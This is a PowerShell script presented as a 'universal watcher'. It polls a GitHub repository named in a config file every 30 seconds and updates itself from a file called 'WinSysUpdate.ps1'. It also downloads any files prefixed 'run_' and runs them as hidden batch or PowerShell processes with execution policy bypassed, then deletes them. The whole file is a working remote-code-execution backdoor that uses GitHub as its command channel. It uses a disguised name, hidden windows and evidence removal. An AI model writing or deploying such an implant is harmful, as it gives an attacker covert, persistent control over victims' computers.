# --- UNIVERSAL WATCHER WITH DEBUG ---
$dir = Split-Path $MyInvocation.MyCommand.Path
$configFile = Join-Path $dir "config.txt"
$logFile = Join-Path $dir "debug_log.txt"

# Debug logging function
function Write-Log {
    param($msg)
    "$(Get-Date -Format 'HH:mm:ss'): $msg" | Out-File $logFile -Append
}

Write-Log "=== Watcher started ==="

if (Test-Path $configFile) {
    $conf = Get-Content $configFile
    $user = $conf[0].Trim()
    $repo = $conf[1].Trim()
    $url = "https://raw.githubusercontent.com/$user/$repo/refs/heads/main"
    Write-Log "Config loaded: User=$user, Repo=$repo"
} else { 
    Write-Log "ERROR: config.txt not found!"
    exit 
}

while($true) {
    try {
        Write-Log "--- Checking for updates ---"
        
        # 1. Self-Update
        try {
            $remote = Invoke-WebRequest -Uri "$url/WinSysUpdate.ps1" -UseBasicParsing -TimeoutSec 10 | Select-Object -ExpandProperty Content
            if ($remote -and $remote -ne (Get-Content $MyInvocation.MyCommand.Path -Raw)) {
                Write-Log "UPDATE: New version detected, restarting..."
                Set-Content -Path $MyInvocation.MyCommand.Path -Value $remote
                Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -WindowStyle Hidden
                exit
            }
        } catch {
            Write-Log "Self-update check failed: $_"
        }

        # 2. Check GitHub API
        $apiUrl = "https://api.github.com/repos/$user/$repo/contents/"
        Write-Log "Fetching from API: $apiUrl"
        
        $files = Invoke-RestMethod -Uri $apiUrl -UseBasicParsing
        Write-Log "Found $($files.Count) files in repo"
        
        foreach ($f in $files) {
            $n = $f.name
            $u = $f.download_url
            Write-Log "Processing: $n"

            # CREATE command - stays on disk
            if ($n -like "create_*") {
                try {
                    $cleanName = $n -replace "create_",""
                    $targetPath = Join-Path $dir $cleanName
                    Write-Log "CREATE: Downloading $cleanName"
                    
                    $c = Invoke-WebRequest -Uri $u -UseBasicParsing | Select-Object -ExpandProperty Content
                    Set-Content -Path $targetPath -Value $c
                    Write-Log "CREATE: Success - $cleanName created"
                } catch {
                    Write-Log "CREATE ERROR: $_"
                }
            }

            # RUN command - execute and delete
            if ($n -like "run_*") {
                try {
                    $p = Join-Path $dir $n
                    Write-Log "RUN: Downloading $n to $p"
                    
                    Invoke-WebRequest -Uri $u -OutFile $p -UseBasicParsing
                    Write-Log "RUN: File downloaded, executing..."
                    
                    if ($n -like "*.bat") { 
                        Start-Process cmd -ArgumentList "/c `"$p`"" -WindowStyle Hidden
                        Write-Log "RUN: Executed as BAT file"
                    }
                    elseif ($n -like "*.ps1") { 
                        Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$p`"" -WindowStyle Hidden
                        Write-Log "RUN: Executed as PS1 file"
                    }

                    # Wait and delete
                    Start-Sleep -Seconds 2
                    if (Test-Path $p) { 
                        Remove-Item -Path $p -Force -ErrorAction SilentlyContinue 
                        Write-Log "RUN: File deleted from disk"
                    }
                } catch {
                    Write-Log "RUN ERROR: $_"
                }
            }
        }
        
        Write-Log "Check cycle complete, sleeping 30s"
        
    } catch { 
        Write-Log "MAIN LOOP ERROR: $_"
    }
    
    Start-Sleep -Seconds 30
}
